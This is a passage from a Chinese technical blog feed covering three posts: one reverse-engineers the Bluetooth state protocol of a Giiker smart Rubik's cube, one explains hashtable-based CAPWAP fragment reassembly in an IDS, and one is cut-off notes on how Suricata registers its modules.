基础逻辑推理分析</h3><p>在着手分析之前，其实需要搞明白一个问题，这个玩具，它是怎么通过和手机建立蓝牙连接后，将自己的状态同步到手机上的。</p><p>首先，它内部一定是存在感应器来获取魔方转动的情况的，这里的问题是，它给到手机的数据，是什么样子的，理论上只有两种方式</p><ol><li>仅仅给出魔方转动的方向情况，手机端接收到之后，自行进行计算。</li><li>每次转动，都将整个魔方的状态发送到手机上。</li></ol><p>我之前觉着是第二种，因为考虑到蓝牙也许会出现丢包或者数据包传输时的次序问题，所以这里不管怎么想，也都是每次同步状态过去比较稳健的样子。实际着手验证的方式也非常简单，连接手机后随便转动几下，再断开连接，连上另外一个设备，如果魔方状态仍然被同步了，起码说明，它是能存储自身状态的（老实说我在最初分析的时候就是这样想的，但是现在回过头来看，也许还是有点儿牵强吧，因为也存在每次连接同步状态，后续仅仅发送转动方向的可能性）</p><h3 id="0x02-状态获取-amp-信息收集"><a href="#0x02-状态获取-amp-信息收集" class="headerlink" title="0x02 状态获取&amp;信息收集"></a>0x02 状态获取&amp;信息收集</h3><p>接下来的事情比较简单，就是先通过电脑连接上魔方，这个比较简单，代码我也上git了</p><p><a href="https://github.com/EggUncle/GiikerDesktopClient" target="_blank" rel="noopener">https://github.com/EggUncle/GiikerDesktopClient</a></p><p>就是使用bleak的python库，写一点儿python就行了，我这里代码写的比较随意，因为仅仅是分析和获取协议信息，没有进一步开发的打算（本来是有的。。但是没啥时间了），可以拿到这样的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Connected: True</span><br><span class="line">[Service] 180A: Device Information</span><br><span class="line">[Characteristic] 2A29: (read) | Name: , Value: b&apos;GiCube.Co.Ltd&apos; 4769437562652e436f2e4c7464</span><br><span class="line">[Service] 180F: Battery Service</span><br><span class="line">[Characteristic] 2A19: (read,notify) | Name: , Value: b&apos;7&apos; 37</span><br><span class="line">[Descriptor] 2902: (Handle: 15) | Value: b&apos;\x00\x00&apos; 0000</span><br><span class="line">[Service] AADB: Unknown</span><br><span class="line">[Characteristic] AADC: (read,notify) | Name: , Value: b&apos;\x124Vx3333\x124Vx\x9a\xbc\x00\x00a\x13a\x13&apos; 1234567833333333123456789abc000061136113   这个大概率是魔方状态</span><br><span class="line">[Descriptor] 2902: (Handle: 19) | Value: b&apos;\x00\x00&apos; 0000</span><br><span class="line">[Service] AAAA: Unknown</span><br><span class="line">[Characteristic] AAAB: (notify) | Name: , Value: None</span><br><span class="line">[Descriptor] 2902: (Handle: 23) | Value: b&apos;\x00\x00&apos; 0000</span><br><span class="line">[Characteristic] AAAC: (write-without-response) | Name: , Value: None</span><br><span class="line">[Service] 00001530-1212-EFDE-1523-785FEABCD123: Unknown</span><br><span class="line">[Characteristic] 00001532-1212-EFDE-1523-785FEABCD123: (write-without-response) | Name: , Value: None</span><br><span class="line">[Characteristic] 00001531-1212-EFDE-1523-785FEABCD123: (write,notify) | Name: , Value: None</span><br><span class="line">[Descriptor] 2902: (Handle: 31) | Value: b&apos;\x00\x00&apos; 0000</span><br><span class="line">[Characteristic] 00001534-1212-EFDE-1523-785FEABCD123: (read) | Name: , Value: b&apos;\x01\x00&apos; 0100</span><br></pre></td></tr></table></figure></p><p>蓝牙协议我其实不怎么熟悉，就是随便看了看，简单提一下，其实可以吧蓝牙设备抽象成一个类，它提供各种各样的服务，也就是一些成员变量或者函数，用的时候，去调用相关服务获取信息就行了。这里能看到一个比较可疑的Characteristic：AADC，因为它带的数据量看起来最大，符合我前面说的“每一次通信包含整个魔方状态”的推论，因此这里进一步进行一些转动，收集到了一些数据。</p><p>需要注意的是，从一个协议角度来理解整个魔方转动状态的时候，毫无疑问的是，魔方的中轴一定是不动的，也就是说，保持一个方向，不会对整个魔方进行转体之类的操作。</p><p>这里整体以蓝色为顶，橙色为前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">复原状态：</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 6113 6113</span><br><span class="line"></span><br><span class="line">最上面那层 顺时针拧一下 即 U</span><br><span class="line">1234 8567 3333 3333 1234 5678 c9ab 0000 1161 1311</span><br><span class="line">1234 7856 3333 3333 1234 5678 bc9a 0000 1111 6113</span><br><span class="line">1234 6785 3333 3333 1234 5678 abc9 0000 1111 1161</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 1111 1111</span><br><span class="line"></span><br><span class="line">最右 R</span><br><span class="line">1624 5738 3223 3223 1264 5b38 9a7c 2620 4111 1111</span><br><span class="line">1764 5328 3333 3333 12b4 5768 9a3c 0000 4141 1111</span><br><span class="line">1374 5268 3223 3223 1274 53b8 9a6c 2620 4141 4111</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 4141 4141</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最下面一层 拧一下 D</span><br><span class="line">4123 5678 3333 3333 4123 5678 9abc 0000 6363 6361</span><br><span class="line">3412 5678 3333 3333 3412 5678 9abc 0000 6363 6363</span><br><span class="line">2341 5678 3333 3333 2341 5678 9abc 0000 6363 6363</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 6363 6363</span><br><span class="line"></span><br><span class="line">最前面一层 F</span><br><span class="line">1273 5684 3311 3311 1237 56c4 9ab8 0000 3163 6363</span><br><span class="line">1287 5643 3333 3333 123c 5687 9ab4 0000 3131 6363</span><br><span class="line">1248 5637 3311 3311 1238 564c 9ab7 0000 3131 3163</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 3131 3131</span><br></pre></td></tr></table></figure></p><p>拿到了这些信息的样子，接下来进行进一步的分析</p><h3 id="0x03-协议信息分析"><a href="#0x03-协议信息分析" class="headerlink" title="0x03 协议信息分析"></a>0x03 协议信息分析</h3><p>首先，在魔方复原状态下，出现了很多很规律的数据，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1-8位的数据是 1234 5678</span><br><span class="line">17-28位的数据是 1234 5678 9abc</span><br></pre></td></tr></table></figure></p><p>首先魔方的每一块颜色都不一样（这里指三维状态下的块），因此，肯定是需要使用不同的代码来标示不同的块的，因此这两段数据，有很大的可能，是代指各个块，魔方的角块有8个，而棱块有12个，正好对应上了这两组数据。（诶这里就一句话就吧最关键的块数据情况描述出来了，我当时看其实看了老半天。。）</p><p>这里再放一张图来说说啥是角块啥是棱块吧：<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/%E6%88%AA%E5%B1%8F2020-07-27%20%E4%B8%8B%E5%8D%889.36.32.png?raw=true" alt=""></p><p>然后这里使用了一些常见的魔方公式，比如说PLL中的三棱块对调：<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/%E6%88%AA%E5%B1%8F2020-07-27%20%E4%B8%8B%E5%8D%889.38.56.png?raw=true" alt=""></p><p>获取到了这样的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对换蓝色层的棱块</span><br><span class="line">对换前</span><br><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 3331 6361</span><br><span class="line">后</span><br><span class="line">1234 5678 3333 3333 1234 5678 bc9a 0000 2143 2143</span><br></pre></td></tr></table></figure></p><p>可以看到， 9abc 变成了 bc9a，总的来说就是通过这类的变换，最后获取到了每一个编码对应的魔方的块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">棱块：</span><br><span class="line">绿黄 1</span><br><span class="line">绿红 2</span><br><span class="line">绿白 3</span><br><span class="line">橙绿 4</span><br><span class="line">红黄 5</span><br><span class="line">红白 6</span><br><span class="line">橙白 7</span><br><span class="line">橙黄 8</span><br><span class="line">蓝黄 9</span><br><span class="line">蓝红 a</span><br><span class="line">蓝白 b</span><br><span class="line">橙蓝 c</span><br><span class="line"></span><br><span class="line">角块：</span><br><span class="line">黄绿红 1</span><br><span class="line">红绿白 2</span><br><span class="line">白橙绿 3</span><br><span class="line">黄绿橙 4</span><br><span class="line">黄蓝红 5</span><br><span class="line">红蓝白 6</span><br><span class="line">白橙蓝 7</span><br><span class="line">黄蓝橙 8</span><br></pre></td></tr></table></figure></p><p>这样，整个块的编码就清楚了，接下来还有一个问题也迎刃而解了，就是，角块和棱块后面对应的数据分别是什么。后续我又进行了一些转动，简单推理得出，3333 3333 这段数据，就是对应每一个棱块的朝向，因为他们仅仅只有1/2/3 三种数字出现，而棱块只有两个朝向，因此使用二进制数据标示 000 三个十六进制数字，转换成二进制正好是12个0，这样就说得通的，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1234 5678 3333 3333 1234 5678 9abc 0000 3331 6361</span><br><span class="line">A    B    C    D    E    F    G    H    I    J</span><br><span class="line"></span><br><span class="line">棱块：EFG坐标 H 前三个数字的二进制为朝向</span><br><span class="line">角块：AB坐标 CD朝向</span><br></pre></td></tr></table></figure></p><h3 id="0x04-block之后的发散思路"><a href="#0x04-block之后的发散思路" class="headerlink" title="0x04 block之后的发散思路"></a>0x04 block之后的发散思路</h3><p>老实说分析到上面那一步之后，我就整个block住了，因为我实在是不太明白其中朝向的和这串数据到底有什么关系。。当时一直念叨着，朝向朝向朝向的，突然想到，整个魔方协议的设计思路，和魔方的一个项目，有很强的关系—盲拧。 诶早年在南昌WCA的时候，看过两个钟头盲39个三阶的巨佬，太强了，算了不扯远了，说回盲拧的事情。我并不会盲拧，但是早些年玩魔方的时候，有一些玩魔方的朋友会这玩意，简单和他们聊过，总体来说就是，通过记忆魔方的编码情况，然后通过一系列比较特殊的，对整个魔方状态改动比较小的公式（我可能不太能描述清楚这个概念，大致意思就是，在交换一些使用者期望交换的块之后，其他块尽可能的保持不变），魔方盲拧的编码方式种类也比较多，后来真的找着了：</p><p><a href="https://my.oschina.net/flylb/blog/729487" target="_blank" rel="noopener">https://my.oschina.net/flylb/blog/729487</a></p><p>这里仅仅看编码的部分就好了，整体思路非常接近，唯一有一点点区别的是，棱块的朝向在这个编码中不是1/2/3，而是0/1/2，且棱块的高/中/低级面，和角块的高/中/低级面，并不相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">棱块：</span><br><span class="line">高级色 橙色 红色</span><br><span class="line">中级色 白色 黄色</span><br><span class="line">低级色 蓝色 绿色</span><br><span class="line"></span><br><span class="line">角块：</span><br><span class="line">高级色 蓝色 绿色</span><br><span class="line">中级色 橙色 红色</span><br><span class="line">低级色 白色 黄色</span><br></pre></td></tr></table></figure><p>这里在分析和最后代码实现其实也花了很多时间，不过本身仅仅是一些业务逻辑，不涉及问题分析，这里就不记了，回头看看代码吧。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>总的来说就只是一个，逆向的分析思路吧，其实挺简单的</p><ol><li>逻辑分析推理 （如果我来整这玩意，咋样能合适一点儿）</li><li>信息收集 （收集一批数据看看，是不是和猜想一样的）</li><li>思路发散 （如果真的分析不动了，找找资料看看也没有类似的玩意）</li></ol><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><ol><li><a href="https://cube3x3.com/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E9%AD%94%E6%96%B9/" target="_blank" rel="noopener">https://cube3x3.com/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E9%AD%94%E6%96%B9/</a></li><li><a href="http://www.mf100.org/base.htm" target="_blank" rel="noopener">http://www.mf100.org/base.htm</a></li><li><a href="http://www.mf100.org/cfop/pll.htm" target="_blank" rel="noopener">http://www.mf100.org/cfop/pll.htm</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发自安全客平台 &lt;a href=&quot;https://www.anquanke.com/post/id/211979&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/211979&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;本文大致记录了一个，对于蓝牙魔方中的协议逆向分析的步骤。&lt;/p&gt;
&lt;p&gt;去年年初的时候，对蓝牙有一点儿兴趣，搞了搞ubertooth one（好像是叫这个名字？ 进不清楚了），用来嗅探蓝牙数据的，然后顺手又买了一个计客的魔方，带蓝牙功能的，简单来说就是基于蓝牙和手机的数据传输，将魔方的状态输出到手机上，以此来实现一些好玩的小功能的（诶再说下去感觉像是在打广告了）&lt;/p&gt;
&lt;p&gt;总的来说，仅仅是记录一个，处理问题接近问题的思路，具体关于拧动魔方的方向，这里也不提了，回头带一个魔方入门教程在结尾的参考中吧。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="协议逆向" scheme="http://yoursite.com/tags/%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>HashTable应用实例-流还原&amp;碎片重组</title>
    <link href="http://yoursite.com/2020/07/27/HashTable%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B-%E6%B5%81%E8%BF%98%E5%8E%9F-%E7%A2%8E%E7%89%87%E9%87%8D%E7%BB%84/"/>
    <id>http://yoursite.com/2020/07/27/HashTable%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B-%E6%B5%81%E8%BF%98%E5%8E%9F-%E7%A2%8E%E7%89%87%E9%87%8D%E7%BB%84/</id>
    <published>2020-07-27T12:49:53.000Z</published>
    <updated>2020-07-28T14:09:26.834Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在网络数据传输中，可能由于MTU等因素造成数据流本身被分成多个包，变得碎片化，很多协议都有类似的情况，例如ip的碎片，tcp的流还原，以及coap的block传输等等。<br>碎片重组和流还原本质上都是将一段一段的数据，合并或者说还原成期望的样子，而在这个还原操作中，常见的数据结构就是HashTable，这里不讨论具体语言实现中的一些HashTable的情况，例如线程是否安全等等，仅仅从数据结构本身的性质，记录一下关于它的实际应用-CAPWAP碎片还原。整个hashtable代码本身仅仅是从一个IDS里头看到的，自身实现的，比较简单的hashtable，解析capwap顺手用到了。</p><p>HashTable本身的数据结构啥样这里就不提了，我觉得碎片重组和流还原本身比较相似，所以下文中仅仅介绍碎片重组。</p><a id="more"></a><h3 id="0x01-碎片重组基本思路"><a href="#0x01-碎片重组基本思路" class="headerlink" title="0x01 碎片重组基本思路"></a>0x01 碎片重组基本思路</h3><p>首先忽略CAPWAP协议本身的特征和各种标志位以及操作码等等，概括的描述一下，一个碎片包，如果需要重组，需要拥有什么信息，以及如何重组<br>需要拥有的信息：</p><ol><li>五元祖，源目的ip/端口/传输层协议</li><li>标志位，标示该报文是碎片包，以及是否是最后一个碎片包等等</li><li>偏移量，标示该数据包的载荷，在最后还原的数据中的偏移位置</li><li>碎片ID，也叫标示符，不同的协议可能叫法不太一样，总的来说就是协议栈提供的，需要保证这一批碎片中，这个值是相等的，以此来保证他们</li></ol><p>理论上来说有这些信息，就可以进行组合或者还原了<br>重组的方式也很简单，识别出来这条流之后（识别方式可以通过源目的端口以及ip等），根据偏移进行组装就可以了</p><h3 id="0x02-识别流的方式"><a href="#0x02-识别流的方式" class="headerlink" title="0x02 识别流的方式"></a>0x02 识别流的方式</h3><p>这里简单提一下，识别流的方式。</p><p>理论上部分网卡（ixgbe）本身是有这种功能的，实现的具体方式我也不清楚，具体来说就是pfring这种数据包捕获的方式，在有驱动一类东西支持的情况下，可以自行设置并发数，在里头会自行将对应的流放置与不同的并发的队列中。<br>代码中实现流识别的方式也比较简单，通过源目的ip和端口就可以了，不过之前看IDS的代码发现一个比较有意思的事情是，它是给每个流计算了一个ID的，ID的计算方式，就是通过源目的ip和端口一类的信息，但是一个流，是很可能有数据交互的情况的，即源目的ip端口相反的情况，因此在该IDS中，它在计算这个流ID的时候，会自动将ip这个值本身比较大的哪一组ip和端口，放置在计算id逻辑的前面。简单用伪代码标示就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IP1;</span><br><span class="line">PORT1;</span><br><span class="line">IP2;</span><br><span class="line">PORT2;</span><br><span class="line"></span><br><span class="line">if IP1&gt;IP2:</span><br><span class="line">  flow_id = IP1+IP2+PORT1+PORT2</span><br><span class="line">else:</span><br><span class="line">  flow_id = IP2+IP1+PORT2+PORT1</span><br></pre></td></tr></table></figure></p><p>这样可以保证不管是源到目的的数据包还是目的给源返回的数据包，计算出来的id都是一致的，就可以识别成一条流。</p><h3 id="0x03-碎片重组-amp-HashTable"><a href="#0x03-碎片重组-amp-HashTable" class="headerlink" title="0x03 碎片重组&amp;HashTable"></a>0x03 碎片重组&amp;HashTable</h3><p>将上面的信息进一步抽象，其实可以将数据分为两部分</p><ol><li>id</li><li>数据载荷，即需要组合还原出来的数据</li></ol><p>这个情况，用hashtable处理就非常合适，简单来说就是通过id进行一些hash计算，得到一个在hashtable中的索引，而这个索引本身对应一段存储空间，用于存储碎片数据的空间，在流还原中，这部分空间就可以是一个链表，根据数据包中的偏移信息，来进行排序。注意，这里的链表，并不是用于处理hash冲突的链地址法中使用的链表。</p><h4 id="0x03-1关于hash冲突"><a href="#0x03-1关于hash冲突" class="headerlink" title="0x03.1关于hash冲突"></a>0x03.1关于hash冲突</h4><p>我这里使用的hashtable时自己实现了这个处理冲突的算法，因为默认的不太好使，其实java里头也有，但是大部分情况下默认的就够了。</p><p>这里导致冲突的原因主要就是，在往hashtable中添加数据计算索引的时候，计算到了同一个值，我之前写的hash函数比较简单，就是直接将flow id与hashtable的大小进行余数运算，果不其然就碰上了，之前同事说可以带上碎片ID进行hash计算，但是后来想了想还是没有使用这种方法，主要原因是，重复是正常现象，说明这个hash重复的数据包，就是来自这条流中的，那就是需要进行重组的。但是还有一种情况是，hash冲突后，这个包并不是属于冲突这个碎片集合所属的流中的，真的就是hash冲突了，那么这个时候，碎片id就碰上用场了，也就是说，在hashcompare函数中，进一步进行碎片id的对比，就可以比较好的处理这个问题了。</p><p>整体来看可以通过一张图描述（用processon画的，凑合看看吧）<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/%E6%88%AA%E5%B1%8F2020-07-27%20%E4%B8%8B%E5%8D%888.36.13.png?raw=true" alt=""></p><p>index代表hashtable的索引，bucket即为上文中提到的，链地址法处理hash冲突的体现，而在这个实际应用中，为了存储并还原数据，因此使用了链表来进一步存储碎片。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>hashtable这个，以前写andorid和用java的时候，都有使用到，但是后来整杂活之后，就比较少使用这个数据结构了，或者说没有这么直接的使用它，相对高级一些的语言，例如java、python等，这类语言对它都进行了比较好的封装，我这回使用的是c的，需要自己实现hash函数、释放函数、以及处理hash冲突的hashCompare函数。这回不知道为啥，觉得hashtable这个玩意，很亲切。。。</p><p>哎，太菜了，还是要多学学，之前因为一些各种各样的原因，客户的pcap直到临近交付才给到我们，结果发现我们使用的流量处理程序无法解析其中出现的CAPWAP隧道协议，加了一个周末的班，调研了各种方案，甚至到了抓包驱动那一层，后来感觉自己写也就那么回事。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;在网络数据传输中，可能由于MTU等因素造成数据流本身被分成多个包，变得碎片化，很多协议都有类似的情况，例如ip的碎片，tcp的流还原，以及coap的block传输等等。&lt;br&gt;碎片重组和流还原本质上都是将一段一段的数据，合并或者说还原成期望的样子，而在这个还原操作中，常见的数据结构就是HashTable，这里不讨论具体语言实现中的一些HashTable的情况，例如线程是否安全等等，仅仅从数据结构本身的性质，记录一下关于它的实际应用-CAPWAP碎片还原。整个hashtable代码本身仅仅是从一个IDS里头看到的，自身实现的，比较简单的hashtable，解析capwap顺手用到了。&lt;/p&gt;
&lt;p&gt;HashTable本身的数据结构啥样这里就不提了，我觉得碎片重组和流还原本身比较相似，所以下文中仅仅介绍碎片重组。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>suricata5.0.2模块加载及运行笔记</title>
    <link href="http://yoursite.com/2020/04/24/suricata%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/24/suricata%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-24T12:57:13.000Z</published>
    <updated>2020-07-28T14:09:33.642Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>诶好久没记点儿东西了，这段时间整的杂活也比较多，最近看了一些suricata的部分，这里简单的记一下，suricata的模块是如何注册，生效以及运行的。</p><p>整个模块化的情况可以用一张图概括，出处 <a href="https://blog.csdn.net/shenwansangz/article/details/37900875" target="_blank" rel="noopener">https://blog.csdn.net/shenwansangz/article/details/37900875</a></p><p><img src="https://img-blog.csdn.net/20140717093204890?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2hlbndhbnNhbmd6/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p>简单来说，就是在一个线程中保存了一个slot链表，每一个slot结构体中，保存了一个模块，在后续运行的时候，会对slot进行遍历，将里面的模块取出并运行。</p><p>主要分为以下几个步骤</p><ol><li>模块注册</li><li>模块初始化</li><li>模块关联运行模式</li><li>模块运行</li></ol><a id="more"></a><h3 id="0x01-模块注册"><a href="#0x01-模块注册" class="headerlink" title="0x01 模块注册"></a>0x01 模块注册</h3><p>主要的注册逻辑在函数RegisterAllModules中，它的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void RegisterAllModules(void)</span><br><span class="line">&#123;</span><br><span class="line">    // zero all module storage</span><br><span class="line">    memset(tmm_modules, 0, TMM_SIZE * sizeof(TmModule));</span><br><span class="line"></span><br><span class="line">    /* commanders */</span><br><span class="line">    TmModuleUnixManagerRegister();</span><br><span class="line">  ........</span><br><span class="line">    TmModuleDebugList();</span><br><span class="line">    /* nflog */</span><br><span class="line">    TmModuleReceiveNFLOGRegister();</span><br><span class="line">    TmModuleDecodeNFLOGRegister();</span><br><span class="line"></span><br><span class="line">    /* windivert */</span><br><span class="line">    TmModuleReceiveWinDivertRegister();</span><br><span class="line">    TmModuleVerdictWinDivertRegister();</span><br><span class="line">    TmModuleDecodeWinDivertRegister();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所有的模块都是存储在tmm_modules数组中，它是一个TmModule结构体数组，每一个索引对于一个模块，在代码中是写死的，索引对应一个枚举类型，定义在src/tm-threads-common.h中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;</span><br><span class="line">    TMM_FLOWWORKER,</span><br><span class="line">    TMM_DECODENFQ,</span><br><span class="line">    TMM_VERDICTNFQ,</span><br><span class="line">    TMM_RECEIVENFQ,</span><br><span class="line">    TMM_RECEIVEPCAP,</span><br><span class="line">    TMM_RECEIVEPCAPFILE,</span><br><span class="line">    TMM_DECODEPCAP,</span><br><span class="line">    TMM_DECODEPCAPFILE,</span><br><span class="line">    TMM_RECEIVEPFRING,</span><br><span class="line">    TMM_DECODEPFRING,</span><br><span class="line">    TMM_RESPONDREJECT,</span><br><span class="line">    TMM_DECODEIPFW,</span><br><span class="line">    TMM_VERDICTIPFW,</span><br><span class="line">    TMM_RECEIVEIPFW,</span><br><span class="line">    TMM_RECEIVEERFFILE,</span><br><span class="line">    TMM_DECODEERFFILE,</span><br><span class="line">    TMM_RECEIVEERFDAG,</span><br><span class="line">    TMM_DECODEERFDAG,</span><br><span class="line">    TMM_RECEIVEAFP,</span><br><span class="line">    TMM_DECODEAFP,</span><br><span class="line">    TMM_RECEIVENETMAP,</span><br><span class="line">    TMM_DECODENETMAP,</span><br><span class="line">    TMM_ALERTPCAPINFO,</span><br><span class="line">    TMM_RECEIVENAPATECH,</span><br><span class="line">    TMM_DECODENAPATECH,</span><br><span class="line">    TMM_STATSLOGGER,</span><br><span class="line">    TMM_RECEIVENFLOG,</span><br><span class="line">    TMM_DECODENFLOG,</span><br><span class="line">    TMM_RECEIVEWINDIVERT,</span><br><span class="line">    TMM_VERDICTWINDIVERT,</span><br><span class="line">    TMM_DECODEWINDIVERT,</span><br><span class="line"></span><br><span class="line">    TMM_FLOWMANAGER,</span><br><span class="line">    TMM_FLOWRECYCLER,</span><br><span class="line">    TMM_BYPASSEDFLOWMANAGER,</span><br><span class="line">    TMM_DETECTLOADER,</span><br><span class="line"></span><br><span class="line">    TMM_UNIXMANAGER,</span><br><span class="line"></span><br><span class="line">    TMM_SIZE,</span><br><span class="line">&#125; TmmId;</span><br></pre></td></tr></table></figure></p><p>模块注册本身也比较简单，这里随便找一个注册函数看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void TmModuleFlowWorkerRegister (void)</span><br><span class="line">&#123;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].name = &quot;FlowWorker&quot;;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].ThreadInit = FlowWorkerThreadInit;</span><br><span class="line">    